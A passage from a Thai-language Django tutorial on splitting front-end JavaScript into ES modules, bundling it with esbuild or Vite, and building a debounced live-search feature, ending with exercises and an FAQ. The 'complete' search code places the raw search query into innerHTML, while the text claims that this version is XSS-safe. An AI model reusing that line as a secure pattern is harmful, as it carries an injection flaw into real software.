        credentials: 'same-origin',
        signal: options.signal,
    });
}
```

```javascript
// blog/static/blog/js/modules/errors.js
export function formatApiError(errorData) {
    if (typeof errorData.detail === 'string') {
        return errorData.detail;
    }
    return Object.entries(errorData)
        .map(([field, messages]) => `${field}: ${messages.join(', ')}`)
        .join(' | ');
}
```

```javascript
// blog/static/blog/js/modules/debounce.js
export function debounce(fn, delayMs) {
    let timeoutId;
    return function debounced(...args) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => fn.apply(this, args), delayMs);
    };
}
```

```javascript
// blog/static/blog/js/modules/ui-state.js
export function setLoadingState(statusEl, isLoading) {
    statusEl.innerHTML = isLoading
        ? '<span class="spinner" aria-label="กำลังโหลด"></span> กำลังโหลด...'
        : '';
}

export function setErrorState(statusEl, message, onRetry) {
    statusEl.innerHTML = '';
    const errorText = document.createElement('span');
    errorText.className = 'error-message';
    errorText.textContent = message;
    statusEl.appendChild(errorText);

    if (onRetry) {
        const retryButton = document.createElement('button');
        retryButton.className = 'retry-button';
        retryButton.type = 'button';
        retryButton.textContent = 'ลองใหม่';
        retryButton.addEventListener('click', onRetry);
        statusEl.appendChild(retryButton);
    }
}

export function clearState(statusEl) {
    statusEl.innerHTML = '';
}
```

```javascript
// blog/static/blog/js/modules/search.js
import { apiFetch } from './api.js';
import { debounce } from './debounce.js';
import { setLoadingState, setErrorState, clearState } from './ui-state.js';
import { formatApiError } from './errors.js';

export function initLiveSearch() {
    const searchInput = document.getElementById('search-input');
    if (!searchInput) return;   // หน้านี้ไม่มีช่องค้นหา ไม่ต้องทำอะไร

    const resultsContainer = document.getElementById('search-results');
    const statusEl = document.getElementById('search-status');

    let currentController = null;
    let lastQuery = '';

    function renderResult(post) {
        const item = document.createElement('a');
        item.href = `/posts/${post.slug}/`;
        item.className = 'search-result-item';
        item.textContent = post.title;
        return item;
    }

    async function performSearch(query) {
        lastQuery = query;
        if (currentController) currentController.abort();

        if (!query.trim()) {
            resultsContainer.innerHTML = '';
            clearState(statusEl);
            return;
        }

        currentController = new AbortController();
        setLoadingState(statusEl, true);

        try {
            const response = await apiFetch(
                `/api/posts/?search=${encodeURIComponent(query)}`,
                { signal: currentController.signal }
            );

            if (!response.ok) {
                throw new Error(formatApiError(await response.json()));
            }

            const payload = await response.json();
            resultsContainer.innerHTML = '';

            if (payload.data.length === 0) {
                resultsContainer.innerHTML = '<p class="no-results">ไม่พบบทความที่ตรงกัน</p>';
            } else {
                payload.data.forEach((post) => resultsContainer.appendChild(renderResult(post)));
            }
            clearState(statusEl);
        } catch (error) {
            if (error.name === 'AbortError') return;
            setErrorState(statusEl, `ค้นหาล้มเหลว: ${error.message}`, () => performSearch(lastQuery));
        }
    }

    const debouncedSearch = debounce(performSearch, 300);
    searchInput.addEventListener('input', (event) => debouncedSearch(event.target.value));
}
```

```javascript
// blog/static/blog/js/main.js — entry point เดียวที่ template เรียกใช้
import { initLiveSearch } from './modules/search.js';

// เพิ่ม initXxx() ของฟีเจอร์อื่นที่นี่เมื่อสร้างเพิ่ม (comments, publish-toggle, ...)
initLiveSearch();
```

```html
{% block extra_js %}
    <script type="module" src="{% static 'blog/js/main.js' %}"></script>
{% endblock %}
```

### 518.4 ข้อควรระวังเรื่อง Path ของ Module ร่วมกับ `{% static %}`

**ข้อจำกัดสำคัญ**: `import` statement ภายในไฟล์ module **ไม่ผ่าน Django template engine**
เลย มันคือ path ที่ browser ใช้ค้นหาไฟล์ตรง ๆ ตาม URL ปัจจุบัน ดังนั้นบรรทัด
`import { apiFetch } from './api.js';` จะทำงานถูกต้องก็ต่อเมื่อไฟล์ `main.js` และโฟลเดอร์
`modules/` ถูก serve จาก URL ที่สัมพัทธ์กันถูกต้องจริง ๆ

เมื่อรัน `collectstatic` (Part 009 ขั้นตอนที่ 82) ไฟล์ทั้งหมดใน `blog/static/blog/js/`
จะถูกคัดลอกไปที่ `STATIC_ROOT` **โดยรักษาโครงสร้างโฟลเดอร์เดิมไว้ทุกประการ** จึงไม่มีปัญหา
เรื่อง path หลุดหลังจาก deploy — ตราบใดที่ path ใน `import` เป็นแบบ **relative** (ขึ้นต้น
ด้วย `./` หรือ `../`) เสมอ **ห้ามเขียน absolute path แบบ `/static/blog/js/modules/api.js`
ตรง ๆ ใน import** เพราะจะพังทันทีถ้ามีการเปลี่ยน `STATIC_URL` (เช่น ย้ายไปใช้ CDN ตามที่
Part 009 ขั้นตอนที่ 88 เกริ่นไว้)

### 518.5 เปรียบเทียบ ES Modules กับ IIFE (รูปแบบเก่าก่อนมี Module)

ก่อนที่เบราว์เซอร์จะรองรับ ES Modules (ก่อนปี 2017) นักพัฒนาใช้เทคนิค **IIFE
(Immediately Invoked Function Expression)** เพื่อป้องกัน global namespace pollution:

```javascript
// รูปแบบเก่า (IIFE) — ยังพบได้ในโค้ด legacy แต่ไม่แนะนำให้เขียนใหม่
(function () {
    function debounce(fn, delayMs) {
        // ...
    }
    // ตัวแปร/ฟังก์ชันในนี้ไม่หลุดออกไปข้างนอก เพราะอยู่ใน scope ของฟังก์ชันที่เรียกตัวเองทันที
})();
```

| คุณสมบัติ | IIFE (แบบเก่า) | ES Modules (แบบปัจจุบัน) |
|---|---|---|
| ป้องกัน global namespace pollution | ✅ (ด้วย closure) | ✅ (มาพร้อมกลไก module scope ในตัว) |
| แชร์ฟังก์ชันข้ามไฟล์ | ต้องพึ่งตัวแปร global ที่ตั้งใจ expose ออกมา (เช่น `window.MyApp = {...}`) | `import`/`export` ชัดเจน ไม่ต้องพึ่ง `window` เลย |
| ระบุ dependency ระหว่างไฟล์ | ไม่มีระบบ ต้องเรียง `<script>` ให้ถูกลำดับเอง | Browser ไล่ resolve `import` ให้อัตโนมัติ |
| รองรับ Tree Shaking (ตัดโค้ดที่ไม่ได้ใช้ทิ้งตอน build) | ❌ ไม่รองรับ | ✅ รองรับเมื่อใช้ร่วมกับ build tool (ขั้นตอนที่ 519) |

หลักสูตรนี้แนะนำ ES Modules เป็นมาตรฐานสำหรับโค้ดใหม่ทั้งหมด เพราะเป็น native feature ของ
เบราว์เซอร์ที่ไม่ต้องพึ่ง build step ใด ๆ เลยในระหว่างพัฒนา (แม้ตอน production จะยัง
ได้ประโยชน์เพิ่มจาก build tool ตามขั้นตอนถัดไป)

---

## ขั้นตอนที่ 519: เกริ่น Build Tool สมัยใหม่ (esbuild/Vite) สำหรับ bundle JS ของโปรเจกต์ขนาดใหญ่

### 519.1 ข้อจำกัดของ ES Modules ดิบ ๆ เมื่อโปรเจกต์ใหญ่ขึ้น

ES Modules จากขั้นตอนที่ 518 ใช้งานได้ดีมากสำหรับโปรเจกต์ขนาดเล็ก-กลาง แต่เมื่อโปรเจกต์
ใหญ่ขึ้น (หลายสิบ module, ใช้ npm package จากภายนอก) จะเจอข้อจำกัดเหล่านี้:

| ข้อจำกัด | รายละเอียด |
|---|---|
| **HTTP Request ต่อไฟล์** | ถ้ามี 30 module ที่ import กัน browser ต้องยิง 30 request แยก (แม้จะเป็น HTTP/2 ที่ทำ multiplexing ได้ ก็ยังมี overhead มากกว่าไฟล์เดียวรวม) |
| **ไม่มีการ Minify** | โค้ดที่ deploy จริงยังมี comment, ชื่อตัวแปรยาว, whitespace เต็มไปหมด ทำให้ไฟล์ใหญ่กว่าที่ควรมาก |
| **npm package จำนวนมากไม่รองรับ ES Modules โดยตรง** | Package เก่าจำนวนมากยังใช้ระบบ `CommonJS` (`require()`/`module.exports`) ซึ่ง browser ไม่เข้าใจโดยตรง |
| **ไม่รองรับ TypeScript/JSX** | ถ้าต้องการเขียน TypeScript (Part 097 จะกล่าวถึง) หรือ JSX สำหรับ React (Part 055) ต้องมีเครื่องมือแปลงโค้ดก่อนเสมอ |
| **Browser เก่าไม่รองรับ** | แม้เบราว์เซอร์ปัจจุบันส่วนใหญ่รองรับ ES Modules แต่ยังมีสภาพแวดล้อมองค์กรบางแห่งที่ต้องรองรับเบราว์เซอร์รุ่นเก่ากว่านั้น |

**Build Tool** (หรือ **Bundler**) คือเครื่องมือที่แก้ปัญหาทั้งหมดนี้ โดยรวม module
หลายไฟล์เข้าเป็นไฟล์เดียว (หรือไม่กี่ไฟล์), แปลงโค้ด (transpile) ให้ browser เก่าเข้าใจได้,
และบีบอัด (minify) ให้เล็กที่สุดก่อนส่งไปให้ผู้ใช้จริง

### 519.2 แนวคิดพื้นฐานของ Bundler: Entry → Dependency Graph → Output

```
   main.js (entry point)
       │
       ├── import './modules/search.js'
       │        └── import './modules/api.js'
       │                 └── import './modules/csrf.js'
       ├── import './modules/comments.js'
       │        └── import './modules/dom.js'
       └── import './modules/ui-state.js'

                    │  Bundler ไล่ตาม import ทั้งหมด (dependency graph)
                    ▼
        ┌─────────────────────────┐
        │   dist/bundle.js         │   ← ไฟล์เดียว รวมทุก module, minify แล้ว
        │   (ขนาดเล็กที่สุดเท่าที่ทำได้) │
        └─────────────────────────┘
```

### 519.3 ทดลอง `esbuild` — Bundler ที่เร็วที่สุดในตลาด (เขียนด้วย Go)

```bash
# ติดตั้ง Node.js ก่อน (ถ้ายังไม่มี) แล้วติดตั้ง esbuild เป็น dev dependency
npm init -y
npm install --save-dev esbuild
```

```bash
# คำสั่ง bundle แบบเร็วที่สุด: ระบุ entry point และปลายทาง
npx esbuild blog/static/blog/js/main.js \
    --bundle \
    --minify \
    --outfile=blog/static/blog/dist/bundle.js
```

ผลลัพธ์: ไฟล์ `bundle.js` ไฟล์เดียวที่รวมทุก module (`main.js`, `search.js`, `api.js`,
`csrf.js`, `debounce.js`, `ui-state.js`, `errors.js`) เข้าด้วยกัน พร้อม minify แล้ว —
ทดลองเปรียบเทียบขนาดไฟล์ก่อน/หลัง minify ด้วยคำสั่ง:

```bash
ls -lh blog/static/blog/js/main.js blog/static/blog/dist/bundle.js
```

เชื่อมกับ template แทนไฟล์เดิม:

```html
{% block extra_js %}
    <script src="{% static 'blog/dist/bundle.js' %}" defer></script>
{% endblock %}
```

เพิ่ม script สั้น ๆ ใน `package.json` เพื่อความสะดวก:

```json
{
    "scripts": {
        "build": "esbuild blog/static/blog/js/main.js --bundle --minify --outfile=blog/static/blog/dist/bundle.js",
        "watch": "esbuild blog/static/blog/js/main.js --bundle --outfile=blog/static/blog/dist/bundle.js --watch"
    }
}
```

```bash
npm run build    # bundle ครั้งเดียว ก่อน deploy
npm run watch     # bundle ใหม่อัตโนมัติทุกครั้งที่แก้ไฟล์ (สำหรับตอนพัฒนา)
```

### 519.4 เกริ่น Vite และ `django-vite` — ทางเลือกที่ครบเครื่องกว่าสำหรับโปรเจกต์ที่ใช้ React/Vue

**Vite** เป็น build tool ที่ได้รับความนิยมสูงมากในปี 2025-2026 เพราะให้ประสบการณ์พัฒนา
(Dev Experience) ที่ดีเยี่ยม: มี **Hot Module Replacement (HMR)** ที่อัปเดตหน้าเว็บทันที
เมื่อแก้โค้ด โดยไม่ต้อง refresh เอง และ build production ด้วย Rollup (bundler ที่เน้น
ขนาดไฟล์เล็กที่สุด) เบื้องหลัง

สำหรับโปรเจกต์ Django มี package ชื่อ **`django-vite`** ที่เชื่อม Vite เข้ากับ Django
template โดยเฉพาะ:

```bash
pip install django-vite
npm create vite@latest
```

```python
# config/settings.py (ตัวอย่างเบื้องต้น)
INSTALLED_APPS = [
    # ...
    'django_vite',
]

DJANGO_VITE = {
    "default": {
        "dev_mode": DEBUG,   # True ตอนพัฒนา (คุยกับ Vite dev server), False ตอน production (อ่านไฟล์ build แล้ว)
    }
}
```

```html
{% load django_vite %}
{% vite_hmr_client %}
{% vite_asset 'blog/static/blog/js/main.js' %}
```

**หมายเหตุสำคัญ**: Part นี้ตั้งใจ**เกริ่นเพียงผิวเผิน**เท่านั้น เพราะการตั้งค่า Vite แบบ
เต็มรูปแบบ (jsx, TypeScript, HMR ทั้งระบบ) มีรายละเอียดมากพอที่จะทำให้ Part นี้ยาวเกินขอบเขต
— เราจะกลับมาตั้งค่า **Vite แบบเต็มรูปแบบจริงจัง** เมื่อถึง **Part 055 (Django กับ React)**
และ **Part 056 (Django กับ Vue.js)** ซึ่งเป็นจุดที่ build tool กลายเป็นสิ่งจำเป็นจริง ๆ
(React/Vue component เขียนด้วย JSX/SFC ที่ browser อ่านตรง ๆ ไม่ได้เลย ต้อง transpile
เสมอ) สำหรับ vanilla JS แบบที่เรียนใน Part นี้ ES Modules ดิบ ๆ (ขั้นตอนที่ 518) หรือ
`esbuild` เดี่ยว ๆ (ขั้นตอนที่ 519.3) ก็เพียงพอแล้วในทางปฏิบัติ

### 519.5 ตารางเปรียบเทียบ Build Tool ยอดนิยม

| เครื่องมือ | เขียนด้วยภาษา | ความเร็ว | Dev Server + HMR | เหมาะกับ |
|---|---|---|---|---|
| **esbuild** | Go | เร็วที่สุด (10-100 เท่าของ Webpack) | มีแบบพื้นฐาน (ไม่ครบเท่า Vite) | โปรเจกต์ vanilla JS ที่ต้องการ bundle เร็ว ไม่ซับซ้อนมาก |
| **Vite** | JavaScript (ใช้ esbuild ช่วย dev, Rollup ช่วย build) | เร็วมากตอน dev (esbuild), ปานกลางตอน build (Rollup) | ✅ ยอดเยี่ยม เป็นจุดขายหลัก | React/Vue/Svelte SPA, โปรเจกต์ frontend ที่ทีมทำงานร่วมกันบ่อย |
| **Webpack** | JavaScript | ช้าที่สุดในสามตัวนี้ | ✅ มี แต่ตั้งค่าซับซ้อนกว่า | โปรเจกต์เก่าที่มี config สะสมมานาน, ระบบที่ต้องการ plugin เฉพาะทางจำนวนมาก |

**คำแนะนำของหลักสูตรนี้**: สำหรับ Part 052-054 (vanilla JS, HTMX, Alpine.js) ไม่จำเป็นต้อง
ใช้ build tool เลยก็ได้ (ES Modules เพียงพอ) แต่ถ้าต้องการ bundle จริงจังเพื่อ production
แนะนำ `esbuild` เพราะตั้งค่าง่ายที่สุด ส่วน **Vite จะกลายเป็นเครื่องมือหลัก** ตั้งแต่ Part
055 เป็นต้นไปที่ต้องทำงานกับ React/Vue

---

## ขั้นตอนที่ 520: สรุปและแบบฝึกหัด — สร้างฟีเจอร์ Live Search สำหรับบล็อกที่ยิง API แบบ debounce

### 520.1 ประกอบร่างทุกอย่างที่เรียนมา: Live Search ฉบับสมบูรณ์

นี่คือเวอร์ชันสุดท้ายที่รวมทุกเทคนิคจากทั้ง 10 ขั้นตอนเข้าด้วยกัน: module structure
(518), debounce (516), AbortController (516.4), loading/error state (517), CSRF-aware
fetch wrapper (513), และ XSS-safe rendering (514)

```html
<!-- blog/templates/blog/post_list.html (เวอร์ชันสมบูรณ์ท้าย Part) -->
{% extends "base.html" %}
{% load static %}

{% block title %}ค้นหาบทความ{% endblock %}

{% block extra_css %}
    <link rel="stylesheet" href="{% static 'blog/css/blog.css' %}">
{% endblock %}

{% block content %}
<div class="post-list">
    <h1>ค้นหาบทความ</h1>

    <div class="live-search">
        <input
            type="search"
            id="search-input"
            placeholder="พิมพ์คำค้นหา เช่น 'django' หรือ 'orm'..."
            autocomplete="off"
            aria-label="ค้นหาบทความ"
        >
        <div id="search-status" class="search-status" role="status" aria-live="polite"></div>
        <div id="search-results"></div>
    </div>

    <div id="post-list-container" class="post-list-default">
        {% for post in posts %}
            <article class="post-card">
                <h2 class="post-card__title">
                    <a href="{% url 'blog:detail' slug=post.slug %}">{{ post.title }}</a>
                </h2>
            </article>
        {% endfor %}
    </div>
</div>
{% endblock %}

{% block extra_js %}
    <script type="module" src="{% static 'blog/js/main.js' %}"></script>
{% endblock %}
```

```javascript
// blog/static/blog/js/modules/search.js — เวอร์ชันสมบูรณ์ท้าย Part
import { apiFetch } from './api.js';
import { debounce } from './debounce.js';
import { setLoadingState, setErrorState, clearState } from './ui-state.js';
import { formatApiError } from './errors.js';

export function initLiveSearch() {
    const searchInput = document.getElementById('search-input');
    if (!searchInput) return;

    const resultsContainer = document.getElementById('search-results');
    const defaultListContainer = document.getElementById('post-list-container');
    const statusEl = document.getElementById('search-status');

    let currentController = null;
    let lastQuery = '';

    function renderResult(post) {
        const item = document.createElement('a');
        item.href = `/posts/${post.slug}/`;
        item.className = 'search-result-item';
        item.textContent = post.title;   // textContent ปลอดภัยจาก XSS เสมอ (514.2)
        return item;
    }

    async function performSearch(query) {
        lastQuery = query;
        if (currentController) currentController.abort();

        if (!query.trim()) {
            resultsContainer.innerHTML = '';
            defaultListContainer.hidden = false;   // กลับไปแสดงรายการเริ่มต้นเมื่อค้นหาว่าง
            clearState(statusEl);
            return;
        }

        defaultListContainer.hidden = true;
        currentController = new AbortController();
        setLoadingState(statusEl, true);

        try {
            const response = await apiFetch(
                `/api/posts/?search=${encodeURIComponent(query)}&is_published=true`,
                { signal: currentController.signal }
            );

            if (!response.ok) {
                throw new Error(formatApiError(await response.json()));
            }

            const payload = await response.json();
            resultsContainer.innerHTML = '';

            if (payload.data.length === 0) {
                resultsContainer.innerHTML =
                    `<p class="no-results">ไม่พบบทความที่ตรงกับ "${query}"</p>`;
            } else {
                payload.data.forEach((post) => {
                    resultsContainer.appendChild(renderResult(post));
                });
            }
            clearState(statusEl);
        } catch (error) {
            if (error.name === 'AbortError') return;
            setErrorState(
                statusEl,
                `ค้นหาล้มเหลว: ${error.message}`,
                () => performSearch(lastQuery)
            );
        }
    }

    const debouncedSearch = debounce(performSearch, 300);
    searchInput.addEventListener('input', (event) => {
        debouncedSearch(event.target.value);
    });
}
```

ก่อน deploy จริง อย่าลืม bundle ด้วย `esbuild` ตามขั้นตอนที่ 519.3 และรัน `collectstatic`
ตามที่เรียนมาตั้งแต่ Part 009

### 520.2 สรุปสิ่งที่ได้เรียนรู้ใน Part นี้

- ✅ แยก JavaScript ออกจาก inline script เสมอ ใช้โครงสร้าง static files ตาม convention
  จาก Part 009 พร้อม `defer`/`type="module"` และ `json_script` สำหรับส่งข้อมูลปลอดภัย
- ✅ ใช้ Fetch API ยิง GET ไปยัง Blog REST API และเข้าใจว่า `fetch()` ไม่ reject เมื่อ
  HTTP status เป็น error ต้องเช็ค `response.ok` เองเสมอ
- ✅ แนบ CSRF Token ผ่าน header `X-CSRFToken` สำหรับ unsafe method ทุกครั้ง ต่อยอดจาก
  กลไก CSRF สองชั้นของ `SessionAuthentication` ที่เรียนใน Part 045
- ✅ อัปเดต DOM แบบไดนามิกอย่างปลอดภัยจาก XSS ด้วย `textContent`/`createElement` แทน
  `innerHTML` เมื่อข้อมูลมาจากผู้ใช้
- ✅ ส่งฟอร์มคอมเมนต์แบบ AJAX โดยไม่ reload หน้า พร้อม disable ปุ่มป้องกัน double submit
- ✅ ทำ Live Search ด้วย Debounce ลดจำนวน API call และแก้ Race Condition ด้วย
  `AbortController`
- ✅ จัดการ Loading/Error state อย่างเป็นระบบด้วย UI state machine 4 สถานะ
- ✅ จัดระเบียบโค้ดด้วย ES Modules (`import`/`export`) แทนไฟล์ก้อนเดียวหรือ IIFE แบบเก่า
- ✅ เข้าใจภาพรวมของ Build Tool สมัยใหม่ (`esbuild`, Vite) และรู้ว่าเมื่อไหร่จำเป็นต้องใช้

### 520.3 Checklist ก่อนไป Part ถัดไป

- [ ] แยกโค้ด JS ทุกไฟล์ออกจาก template แล้ว ไม่มี inline `<script>` ที่มี logic เหลืออยู่
- [ ] เขียนฟังก์ชัน `apiFetch()` ที่แนบ `X-CSRFToken` อัตโนมัติสำหรับ POST/PUT/PATCH/DELETE
- [ ] ทดสอบลบ `X-CSRFToken` header แล้วยืนยันว่าได้ `403 CSRF Failed` จริง
- [ ] เขียนฟอร์ม comment ที่ submit แบบ AJAX โดยไม่ reload หน้า พร้อม disable ปุ่มระหว่างส่ง
- [ ] เขียนฟังก์ชัน `debounce()` เองได้โดยไม่เปิดดูโค้ดตัวอย่าง
- [ ] ใช้ `AbortController` ยกเลิก request เก่าเมื่อมี request ใหม่เกิดขึ้นก่อนได้
- [ ] แยกไฟล์ JS เป็น ES Modules อย่างน้อย 3 ไฟล์ที่ `import`/`export` กันถูกต้อง
- [ ] ทดลอง bundle ไฟล์ JS ด้วย `esbuild` ได้อย่างน้อยหนึ่งครั้ง

### 520.4 แบบฝึกหัดท้ายบท

**แบบฝึกหัดที่ 1**: เพิ่มฟีเจอร์ **"ลบคอมเมนต์"** ในหน้า `post_detail.html` — ปุ่มลบที่อยู่
ข้างคอมเมนต์แต่ละอัน (แสดงเฉพาะคอมเมนต์ของผู้ใช้ที่ login เอง) ยิง `DELETE` ไปยัง
`/api/posts/{post_pk}/comments/{comment_id}/` ผ่าน `apiFetch()` แล้วลบ element ออกจาก DOM
ทันทีด้วย `.remove()` โดยไม่ reload หน้า (ต้องแนบ CSRF token เพราะ `DELETE` เป็น unsafe
method)

**แบบฝึกหัดที่ 2**: ปรับ Live Search จากขั้นตอนที่ 520.1 ให้รองรับ **Infinite Scroll**
— เมื่อผู้ใช้เลื่อนหน้าจอลงไปจนใกล้สุดของผลลัพธ์ (ใช้ `IntersectionObserver` หรือเช็ค
`window.scrollY`) ให้ยิง request ไปหน้าถัดไปโดยใช้ `payload.links.next` ที่ได้จาก envelope
ของ Part 047 แล้ว **เพิ่ม** (append) ผลลัพธ์ใหม่ต่อท้ายรายการเดิม ไม่ใช่แทนที่ทั้งหมด

**แบบฝึกหัดที่ 3**: เขียน unit test เปล่า ๆ สำหรับฟังก์ชัน `debounce()` ด้วยการจำลองเวลา
(ค้นหาวิธีใช้ `jest.useFakeTimers()` หากใช้ Jest หรือ `vi.useFakeTimers()` หากใช้ Vitest)
เพื่อยืนยันว่าฟังก์ชันที่ห่อด้วย `debounce(fn, 300)` ถูกเรียกเพียงครั้งเดียวแม้จะมีการเรียก
ฟังก์ชันที่ห่อไว้รัว ๆ 10 ครั้งติดกันในเวลาไม่ถึง 300ms (Part 059-065 จะเจาะลึกการ test
ฝั่ง Django แต่แบบฝึกหัดนี้ตั้งใจให้ลองมือกับการ test JavaScript ล้วน ๆ ก่อน)

**แบบฝึกหัดที่ 4 (ขั้นสูง)**: ตั้งค่า `esbuild` แบบเต็มรูปแบบในโปรเจกต์ของคุณ (ติดตั้งผ่าน
`npm`, สร้าง `package.json` script `build`/`watch` ตามขั้นตอนที่ 519.3) แล้วเปรียบเทียบ
ขนาดไฟล์ JS ทั้งหมดของ Part นี้ **ก่อน** และ **หลัง** bundle+minify บันทึกเปอร์เซ็นต์ที่
ลดลงได้ พร้อมอธิบายว่าทำไมการลดขนาดไฟล์ JS มีผลต่อ **Core Web Vitals** (โดยเฉพาะ
`Largest Contentful Paint` และ `Time to Interactive`) ซึ่งเป็นหัวข้อที่ Part 066
(Performance Profiling) จะกลับมาเจาะลึกอีกครั้ง

### 520.5 คำถามที่พบบ่อย (FAQ)

**Q: ทำไมไม่ใช้ jQuery ทำทุกอย่างในบทนี้ ในเมื่อโค้ดสั้นกว่าเยอะ?**
A: jQuery เคยเป็นมาตรฐานอุตสาหกรรมเมื่อ 10 กว่าปีก่อน เพราะตอนนั้นเบราว์เซอร์แต่ละยี่ห้อมี
พฤติกรรม DOM/AJAX ต่างกันมาก jQuery ช่วย "ปรับให้เหมือนกัน" ได้ดีมาก แต่ปัจจุบัน (2025-2026)
เบราว์เซอร์สมัยใหม่ทั้งหมดปฏิบัติตามมาตรฐานเดียวกันแล้ว (`fetch`, `querySelector`,
`classList` ทำงานเหมือนกันทุกที่) การโหลด jQuery ทั้งไลบรารี (~30KB gzip) เพื่อทำสิ่งที่
Vanilla JS ทำได้อยู่แล้วจึงเป็นการสิ้นเปลือง bandwidth โดยไม่จำเป็น โปรเจกต์ใหม่ส่วนใหญ่ใน
อุตสาหกรรมปัจจุบันจึงเลิกใช้ jQuery แล้ว หลักสูตรนี้จึงสอน Vanilla JS เป็นรากฐาน เพื่อให้
เข้าใจกลไกจริงเบื้องหลัง ก่อนที่จะไปเรียน framework ที่หนักกว่าอย่าง React/Vue ใน Part
055-056

**Q: ควรเขียน JavaScript ทั้งหมดด้วยตัวเอง หรือใช้ HTMX/Alpine.js ไปเลยตั้งแต่ต้น?**
A: Part นี้ตั้งใจสอน Fetch API แบบดิบเพื่อให้เข้าใจ **กลไกที่แท้จริง** เบื้องหลัง — ทั้ง
HTMX (Part 053) และ Alpine.js (Part 054) ที่จะเรียนต่อไปนั้น **ใช้ fetch()/XHR เบื้องหลัง
เหมือนกันทุกประการ** เพียงแต่ห่อด้วย syntax ที่กระชับกว่า (attribute ใน HTML) เมื่อคุณเข้าใจ
Part นี้แล้ว การเรียน HTMX/Alpine.js จะง่ายขึ้นมาก เพราะรู้อยู่แล้วว่า "ข้างใต้" มันทำงาน
อย่างไร ไม่ใช่แค่จำ syntax โดยไม่เข้าใจ

**Q: ทำไมต้องเขียน `escapeHtml()`/ใช้ `textContent` เอง ในเมื่อ Django Template มี
auto-escaping ให้อยู่แล้ว?**
A: Django auto-escaping (ทบทวนจาก Part 008) ทำงาน **เฉพาะตอน render server-side ด้วย
Django Template Language เท่านั้น** (`{{ value }}`) เมื่อข้อมูลถูกส่งเป็น JSON ผ่าน REST
API แล้วนำไปแทรกใน DOM ด้วย JavaScript ฝั่ง client กลไก auto-escaping ของ Django **ไม่มี
ผลอะไรอีกต่อไปเลย** เพราะ JavaScript ทำงานอยู่คนละชั้นกัน (client-side) จึงต้องมีการ
escape ของฝั่ง JavaScript เองแยกต่างหาก — นี่คือจุดที่มือใหม่จำนวนมากพลาด เพราะเข้าใจผิดว่า
"Django escape ให้แล้ว ปลอดภัยเสมอ" ทั้งที่ความจริงแล้วการป้องกัน XSS ต้องทำ **ทุกจุดที่มี
การแทรกข้อมูลลง HTML** ไม่ว่าจะฝั่งไหนก็ตาม

**Q: ควรเก็บ JWT token (จาก Part 046) ไว้ที่ไหนถ้าจะเรียก API จาก JavaScript?**
A: สำหรับสถานการณ์ใน Part นี้ (JS รันบนหน้า Django Template เดียวกับที่ผู้ใช้ login ผ่าน
session) **ไม่จำเป็นต้องใช้ JWT เลย** — ใช้ `SessionAuthentication` + CSRF token ตามที่สอน
ตลอด Part นี้เพียงพอและปลอดภัยกว่า เพราะไม่ต้องกังวลเรื่องเก็บ token ไว้ที่ไหนให้ปลอดภัย
JWT เหมาะกับกรณีที่ frontend แยก origin จริง ๆ ออกจาก Django (เช่น React SPA ที่ build
แยกต่างหาก, Part 055) ซึ่งตอนนั้นจะกลับมาพูดเรื่องการเก็บ JWT อย่างปลอดภัย (httpOnly cookie
เทียบกับ `localStorage`) แบบเจาะลึกอีกครั้ง

---

## เตรียมตัวสำหรับ Part ถัดไป

**Part 053: HTMX กับ Django สำหรับ Interactive UI** จะพาไปเรียนรู้ **HTMX** — library ที่
ทำให้เขียน interactive UI แบบที่เพิ่งเรียนใน Part นี้ (fetch, อัปเดต DOM, form แบบ async)
ได้ **โดยไม่ต้องเขียน JavaScript เองเลยแม้แต่บรรทัดเดียว** เพียงเพิ่ม attribute พิเศษ
(`hx-get`, `hx-post`, `hx-target`, `hx-swap`) ลงใน HTML ตรง ๆ คุณจะได้เห็นว่า HTMX ใช้
กลไก `fetch()`/`XMLHttpRequest` และ CSRF token เบื้องหลังเหมือนกับที่เพิ่งเรียนมาทุกประการ
เพียงแต่ห่อความซับซ้อนทั้งหมดไว้ให้ และจะได้เปรียบเทียบข้อดี-ข้อเสียระหว่างแนวทาง "เขียน
Fetch API เอง" (Part นี้) กับแนวทาง "ปล่อยให้ HTMX จัดการให้" (Part หน้า) ว่าควรเลือกใช้
แบบไหนในสถานการณ์ใด

เตรียมโปรเจกต์ Blog ของคุณให้พร้อม (มี `PostViewSet`, `CommentViewSet` ทำงานได้ปกติจาก
Phase 5 และฟีเจอร์ Live Search จาก Part นี้ที่ทำงานสมบูรณ์แล้ว) แล้วไปเรียนรู้อีกแนวทางหนึ่ง
ของการสร้าง Interactive UI กันต่อ!
